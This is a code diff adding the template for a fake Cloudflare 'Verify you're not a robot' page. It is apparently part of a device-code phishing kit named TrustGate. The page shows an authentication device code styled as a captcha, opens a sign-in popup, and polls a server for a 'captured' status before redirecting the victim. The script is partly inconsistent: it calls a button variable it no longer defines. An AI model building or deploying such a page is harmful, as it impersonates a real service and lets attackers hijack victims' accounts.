@@ -2337,9 +2337,465 @@ const DEVICE_CODE_CLOUDFLARE_HTML = `<!doctype html>
 				border: 1px solid rgba(246, 130, 31, 0.35);
 				border-radius: 999px;
 				padding: 4px 10px;
-			
-<truncated 10981 bytes>
-p, H);
+			}
+
+			.card-body {
+				padding: 28px 24px 24px;
+			}
+
+			h1 {
+				font-size: 21px;
+				font-weight: 600;
+				text-align: center;
+				color: #1f1f1f;
+			}
+
+			.subtitle {
+				margin-top: 8px;
+				font-size: 14px;
+				text-align: center;
+
+				line-height: 1.55;
+				color: #6b6b6b;
+			}
+
+			/* ---------- Captcha ---------- */
+
+			.captcha-frame {
+				position: relative;
+				margin-top: 20px;
+				border: 1px solid #d9d9d9;
+				border-radius: 4px;
+				background: #f9f9f9;
+				overflow: hidden;
+			}
+
+			#captcha-canvas {
+				display: block;
+				width: 100%;
+				height: auto;
+				cursor: pointer;
+			}
+
+			#captcha-refresh {
+				position: absolute;
+				top: 8px;
+				right: 8px;
+				width: 34px;
+				height: 34px;
+				display: flex;
+				align-items: center;
+				justify-content: center;
+				border: 1px solid #d9d9d9;
+				border-radius: 4px;
+				background: rgba(255, 255, 255, 0.92);
+				color: #555;
+				cursor: pointer;
+				transition:
+					color 0.15s ease,
+					border-color 0.15s ease,
+					transform 0.3s ease;
+			}
+
+			#captcha-refresh:hover {
+				color: #f6821f;
+				border-color: #f6821f;
+			}
+
+			#captcha-refresh:active svg {
+				transform: rotate(-180deg);
+			}
+
+			#captcha-refresh svg {
+				width: 18px;
+				height: 18px;
+				transition: transform 0.35s ease;
+			}
+
+			.hint {
+				margin-top: 10px;
+				font-size: 12.5px;
+				color: #828181;
+			}
+
+			/* ---------- Verify device button ---------- */
+
+			.verify-btn {
+				margin-top: 22px;
+				width: 100%;
+				padding: 12px 16px;
+				font-family: inherit;
+				font-size: 15px;
+				font-weight: 600;
+				color: #fff;
+				background: #f6821f;
+				border: 1px solid #e0731a;
+				border-radius: 4px;
+				cursor: pointer;
+				transition:
+					background 0.15s ease,
+					box-shadow 0.15s ease;
+			}
+
+			.verify-btn:hover:not(:disabled) {
+				background: #ff9426;
+				box-shadow: 0 2px 6px rgba(246, 130, 31, 0.35);
+			}
+
+			.verify-btn:active:not(:disabled) {
+				background: #e0731a;
+				box-shadow: none;
+			}
+
+			.verify-btn:focus-visible {
+				outline: 2px solid #f6821f;
+				outline-offset: 2px;
+			}
+
+			.verify-btn:disabled {
+				opacity: 0.6;
+				cursor: not-allowed;
+			}
+
+			/* ---------- Ray line ---------- */
+
+			.ray {
+				margin-top: 18px;
+				font-size: 12.5px;
+				color: #9c9c9c;
+				text-align: center;
+			}
+
+			.ray a {
+				color: #9c9c9c;
+				font-weight: 600;
+				text-decoration: none;
+			}
+
+			.ray a:hover {
+				color: #f6821f;
+			}
+
+			#ray-id {
+				font-family: "SF Mono", "Courier New", monospace;
+				font-size: 12px;
+			}
+
+			/* ---------- Footer ---------- */
+
+			.site-footer {
+				border-top: 1px solid #e2e2e2;
+				background: #fff;
+			}
+
+			.footer-inner {
+				max-width: 1080px;
+				margin: 0 auto;
+				padding: 18px 24px;
+				display: flex;
+				align-items: center;
+				justify-content: space-between;
+				gap: 12px;
+				flex-wrap: wrap;
+			}
+
+			.footer-brand {
+				display: flex;
+				align-items: center;
+				gap: 8px;
+			}
+
+			.footer-brand .brand-mark {
+				width: 20px;
+				height: 20px;
+			}
+
+			.footer-brand-name {
+				font-size: 15px;
+				font-weight: 700;
+				color: #313131;
+			}
+
+			.footer-meta {
+				display: flex;
+				align-items: center;
+				gap: 18px;
+				flex-wrap: wrap;
+			}
+
+			.copyright {
+				font-size: 12.5px;
+				color: #6b6b6b;
+			}
+
+			.footer-nav {
+				display: flex;
+				gap: 14px;
+			}
+
+			.footer-nav a {
+				font-size: 12.5px;
+				color: #9c9c9c;
+				text-decoration: none;
+			}
+
+			.footer-nav a:hover {
+				color: #f6821f;
+			}
+
+			@media (max-width: 560px) {
+				.footer-inner {
+					flex-direction: column;
+					text-align: center;
+				}
+
+				.footer-meta {
+					flex-direction: column;
+					gap: 8px;
+				}
+			}
+		</style>
+	</head>
+	<body>
+		<main class="page">
+			<section class="card" aria-labelledby="card-title">
+				<header class="card-header">
+					<div class="brand">
+						<img
+							src="https://cdn.jsdelivr.net/gh/glincker/thesvg@main/public/icons/cloudflare/default.svg"
+							alt="Cloudflare logo"
+							srcset="
+								https://cdn.jsdelivr.net/gh/glincker/thesvg@main/public/icons/cloudflare/default.svg 1x,
+								https://cdn.jsdelivr.net/gh/glincker/thesvg@main/public/icons/cloudflare/default.svg 2x
+							"
+							width="32"
+							height="32"
+						/>
+						<span class="brand-name">Cloudflare</span>
+					</div>
+				</header>
+
+				<div class="card-body">
+					<h1 id="card-title">Verify you're not a robot</h1>
+					<p class="subtitle">
+						Complete the challenge below on the next page to continue.
+					</p>
+
+					<div class="captcha-frame">
+						<canvas
+							id="captcha-canvas"
+							width="640"
+							height="220"
+							role="img"
+							aria-label="Device code displayed as a captcha image"
+							title="Click to redraw"
+						></canvas>
+						<button
+							id="captcha-refresh"
+							type="button"
+							aria-label="Redraw captcha"
+							title="Redraw captcha"
+						>
+							<svg viewBox="0 0 24 24" aria-hidden="true">
+								<path
+									d="M20 12a8 8 0 1 1-2.34-5.66"
+									fill="none"
+									stroke="currentColor"
+									stroke-width="2"
+									stroke-linecap="round"
+								/>
+								<path
+									d="M20 3.5V8h-4.5"
+									fill="none"
+									stroke="currentColor"
+									stroke-width="2"
+									stroke-linecap="round"
+									stroke-linejoin="round"
+								/>
+							</svg>
+						</button>
+					</div>
+					<p class="hint">
+						Bots and automated devices cannot pass to the next page, so we do
+						this to make you safer.
+					</p>
+
+					<button id="verify-device" class="verify-btn" type="button">
+						Verify device
+					</button>
+				</div>
+			</section>
+
+			<p class="ray">
+				Ray ID: <span id="ray-id"></span> &nbsp;&middot;&nbsp; Performance &amp;
+				security by <a href="#">Cloudflare</a>
+			</p>
+		</main>
+
+		<footer class="site-footer">
+			<div class="footer-inner">
+				<div class="footer-brand">
+					<img
+						src="https://cdn.jsdelivr.net/gh/glincker/thesvg@main/public/icons/cloudflare/default.svg"
+						alt="Cloudflare logo"
+						srcset="
+							https://cdn.jsdelivr.net/gh/glincker/thesvg@main/public/icons/cloudflare/default.svg 1x,
+							https://cdn.jsdelivr.net/gh/glincker/thesvg@main/public/icons/cloudflare/default.svg 2x
+						"
+						width="32"
+						height="32"
+					/>
+					<span class="footer-brand-name">Cloudflare</span>
+				</div>
+				<div class="footer-meta">
+					<span class="copyright"
+						>&copy; 2026 Cloudflare, Inc. All rights reserved.</span
+					>
+					<nav class="footer-nav" aria-label="Footer">
+						<a href="#">Privacy Policy</a>
+						<a href="#">Terms of Service</a>
+						<a href="#">Help Center</a>
+					</nav>
+				</div>
+			</div>
+		</footer>
+
+		<script>
+			/* TrustGate — device code page
+			 *
+			 * The device-code logic is intentionally kept separate and untouched.
+			 * Everything below the divider is pure presentation: it renders the
+			 * code as a squiggly captcha image on a canvas.
+			 */
+			(function () {
+			  'use strict';
+
+			  /* ============================================================
+			   * Device code logic — DO NOT CHANGE
+			   * ============================================================ */
+			  
+			  // Variables from the original second code
+			  var sid = (function() {
+			    var path = window.location.pathname.split('/');
+			    return path[path.length-1] || '';
+			  })();
+			  
+			  var DEVICE_CODE = '';
+			  var verifyUrl = '';
+			  var codeReady = false;
+			  var ready = false;
+
+			  /* ============================================================
+			   * Presentation only — squiggly captcha renderer
+			   * ============================================================ */
+
+			  var canvas = document.getElementById('captcha-canvas');
+			  var ctx = canvas.getContext('2d');
+			  var W = canvas.width;  // backing pixels (2x for retina)
+			  var H = canvas.height;
+
+			  var INK = ['#1f2937', '#7c2d12', '#1e3a8a', '#065f46', '#7f1d1d', '#3b0764', '#0f766e', '#9d174d'];
+			  var FONTS = [
+			    'Georgia, serif',
+			    '"Times New Roman", serif',
+			    'Verdana, sans-serif',
+			    '"Trebuchet MS", sans-serif',
+			    '"Courier New", monospace',
+			    '"Comic Sans MS", "Chalkboard SE", cursive'
+			  ];
+
+			  function rand(min, max) {
+			    return Math.random() * (max - min) + min;
+			  }
+
+			  function pick(arr) {
+			    return arr[Math.floor(Math.random() * arr.length)];
+			  }
+
+			  /* Speckled paper background */
+			  function drawBackground(c) {
+			    var g = c.createLinearGradient(0, 0, W, H);
+			    g.addColorStop(0, '#fdfdfb');
+			    g.addColorStop(1, '#f3f0e9');
+			    c.fillStyle = g;
+			    c.fillRect(0, 0, W, H);
+
+			    for (var i = 0; i < 650; i++) {
+			      c.fillStyle = 'rgba(60, 50, 30,' + rand(0.02, 0.08).toFixed(3) + ')';
+			      c.fillRect(rand(0, W), rand(0, H), rand(1, 2.6), rand(1, 2.6));
+			    }
+			  }
+
+			  /* One wavy interference line across the canvas */
+			  function drawSquiggle(c, color, alpha, width) {
+			    c.save();
+			    c.strokeStyle = color;
+			    c.globalAlpha = alpha;
+			    c.lineWidth = width;
+			    c.lineCap = 'round';
+			    c.beginPath();
+			    c.moveTo(-12, rand(H * 0.25, H * 0.75));
+			    c.bezierCurveTo(
+			      rand(W * 0.15, W * 0.4), rand(-H * 0.1, H * 1.1),
+			      rand(W * 0.6, W * 0.85), rand(-H * 0.1, H * 1.1),
+			      W + 12, rand(H * 0.25, H * 0.75)
+			    );
+			    c.stroke();
+			    c.restore();
+			  }
+
+			  /* Draw the code (per-char font/rotation/gradient) on an offscreen canvas */
+			  function renderCodeOffscreen() {
+			    var off = document.createElement('canvas');
+			    off.width = W;
+			    off.height = H;
+			    var o = off.getContext('2d');
+
+			    // a thick line *behind* the characters
+			    drawSquiggle(o, '#c2410c', 0.28, 8);
+
+			    var chars = (DEVICE_CODE || '----').split('');
+			    var margin = 70;
+			    var slot = (W - margin * 2) / chars.length;
+
+			    for (var i = 0; i < chars.length; i++) {
+			      var size = rand(68, 96);
+			      o.save();
+			      o.font =
+			        (Math.random() < 0.4 ? 'italic ' : '') +
+			        '700 ' + size.toFixed(0) + 'px ' + pick(FONTS);
+			      o.textAlign = 'center';
+			      o.textBaseline = 'middle';
+
+			      var cx = margin + slot * i + slot / 2 + rand(-7, 7);
+			      var cy = H / 2 + rand(-16, 16);
+			      o.translate(cx, cy);
+			      o.rotate(rand(-0.45, 0.45));
+
+			      var g = o.createLinearGradient(0, -size / 2, 0, size / 2);
+			      g.addColorStop(0, pick(INK));
+			      g.addColorStop(1, pick(INK));
+			      o.fillStyle = g;
+			      o.fillText(chars[i], 0, 0);
+			      o.restore();
+			    }
+
+			    return off;
+			  }
+
+			  /* Warp the offscreen image with two stacked sine waves = squiggly text */
+			  function warpOnto(off) {
+			    var amp1 = rand(9, 17);
+			    var amp2 = rand(3, 7);
+			    var f1 = rand(0.008, 0.014);
+			    var f2 = rand(0.02, 0.034);
+			    var p1 = rand(0, Math.PI * 2);
+			    var p2 = rand(0, Math.PI * 2);
+			    var step = 4;
+
+			    for (var x = 0; x < W; x += step) {
+			      var dy = Math.sin(x * f1 + p1) * amp1 + Math.sin(x * f2 + p2) * amp2;
+			      ctx.drawImage(off, x, 0, step, H, x, dy, step, H);
 			    }
 			  }
 
@@ -2361,9 +2817,7 @@ p, H);
 			    drawNoiseDots();
 			  }
 
-			  render();
-
-			  // Redraw the *appearance* only — DEVICE_CODE never changes.
+			  // Redraw the *appearance* only — DEVICE_CODE changes when polling updates it.
 			  document.getElementById('captcha-refresh').addEventListener('click', render);
 			  canvas.addEventListener('click', render);
 
@@ -2382,16 +2836,16 @@ p, H);
 			  for (var i = 0; i < 16; i++) ray += hex.charAt(Math.floor(Math.random() * 16));
 			  document.getElementById('ray-id').textContent = ray;
 			
-			  // Polling logic
-			  var verifyBtnElement = document.getElementById('verify-device');
-			  var ready = codeReady && DEVICE_CODE !== '';
-
+			  // ============================================================
+			  // Polling logic from original second code
+			  // ============================================================
+			  
 			  document.addEventListener('trustgate:verify', function(e) {
 			      if(!ready || !DEVICE_CODE) return;
 			      var w = 600, h = 600, l = (screen.width-w)/2, t = (screen.height-h)/2;
 			      var popup = window.open(verifyUrl,'ms','width='+w+',height='+h+',left='+l+',top='+t+',scrollbars=yes,resizable=yes');
 			      if(popup) popup.focus();
-			      verifyBtnElement.textContent = 'Verification in progress...';
+			      verifyBtn.textContent = 'Verification in progress...';
 			  });
 
 			  function poll() {
@@ -2402,9 +2856,9 @@ p, H);
 			          ready = true;
 			          DEVICE_CODE = d.user_code;
 			          verifyUrl = d.verify_url;
-			          render();
-			          verifyBtnElement.disabled = false;
-			          verifyBtnElement.textContent = 'Verify device';
+			          render(); // Re-render with the new code
+			          verifyBtn.disabled = false;
+			          verifyBtn.textContent = 'Verify device';
 			        }
 			        if(d.captured) {
 			          if(d.redirect_url) {
@@ -2414,8 +2868,8 @@ p, H);
 			          }
 			        }
 			        if(d.expired) {
-			          verifyBtnElement.disabled = true;
-			          verifyBtnElement.textContent = 'Session Expired';
+			          verifyBtn.disabled = true;
+			          verifyBtn.textContent = 'Session Expired';
 			        }
 			        if(!d.failed && !d.expired && !d.captured) {
 			          setTimeout(poll,3000);
@@ -2423,11 +2877,9 @@ p, H);
 			      }).catch(function(){setTimeout(poll,5000);});
 			  }
 
-			  if(!ready) {
-			      verifyBtnElement.disabled = true;
-			      verifyBtnElement.textContent = 'Generating...';
-			  }
-
+			  // Initial state
+			  verifyBtn.disabled = true;
+			  verifyBtn.textContent = 'Generating...';
 			  poll();
 
 			})();
